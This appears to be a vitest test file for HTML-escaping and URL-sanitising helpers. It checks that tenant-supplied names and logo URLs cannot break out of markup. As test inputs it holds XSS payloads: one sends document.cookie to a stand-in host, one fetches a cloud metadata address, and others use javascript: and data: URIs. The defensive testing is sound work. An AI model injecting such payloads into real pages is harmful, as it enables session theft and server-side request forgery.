import { describe, it, expect } from 'vitest'
import { escapeHtml, safeUrl } from '@/lib/html-escape'

// ============================================================================
// escapeHtml / safeUrl are the two primitives any hand-composed HTML must run
// tenant text through. The Puppeteer PDF route that once relied on them is
// gone (removed with the dependency), but the helpers remain the guard for any
// future markup built by hand, so their breakout resistance is pinned here:
// tenant-controlled text must not escape an attribute or element context, and
// a logo URL must not smuggle a javascript:/data: scheme or an SSRF target.
// ============================================================================

const BREAKOUT = `x" onerror="fetch('http://169.254.169.254/latest/meta-data/')`
const SCRIPT = `</h1><script>fetch('https://evil/'+document.cookie)</script>`

describe('logo in an attribute context', () => {
  // Mirrors: ${safeUrl(company.logoUrl) ? `<img src="${safeUrl(company.logoUrl)}" ... />` : ''}
  const renderLogo = (url: unknown) =>
    safeUrl(url) ? `<img src="${safeUrl(url)}" alt="" style="height:44px" />` : ''

  it('renders NO tag at all for the breakout payload', () => {
    expect(renderLogo(BREAKOUT)).toBe('')
  })

  it('renders nothing for javascript: and data: URIs', () => {
    expect(renderLogo('javascript:alert(1)')).toBe('')
    expect(renderLogo('data:image/svg+xml,<svg onload=alert(1)>')).toBe('')
  })

  it('still renders a genuine logo', () => {
    expect(renderLogo('https://cdn.example.com/logo.png'))
      .toBe('<img src="https://cdn.example.com/logo.png" alt="" style="height:44px" />')
  })

  it('an attacker cannot add attributes: the tag has exactly two quote pairs it did not write', () => {
    const html = renderLogo('https://x.example/a.png?a=1&b=2')
    // 3 attributes we wrote = 6 quotes. No more.
    expect(html.match(/"/g)!.length).toBe(6)
    expect(html).not.toContain('onerror')
  })
})

describe('names and notes in a text context', () => {
  const renderName = (v: unknown) => `<h1>${escapeHtml(v)}</h1>`

  it('cannot close the heading or open a script', () => {
    const html = renderName(SCRIPT)
    expect(html).not.toContain('<script')
    expect(html).not.toContain('</h1><')
    expect(html.match(/</g)!.length).toBe(2) // only <h1> and </h1>
  })

  it('leaves real company names untouched', () => {
    expect(renderName('Afford Egypt')).toBe('<h1>Afford Egypt</h1>')
  })

  it('handles an ampersand in a company name without double-escaping', () => {
    expect(renderName('Nile & Co')).toBe('<h1>Nile &amp; Co</h1>')
  })
})
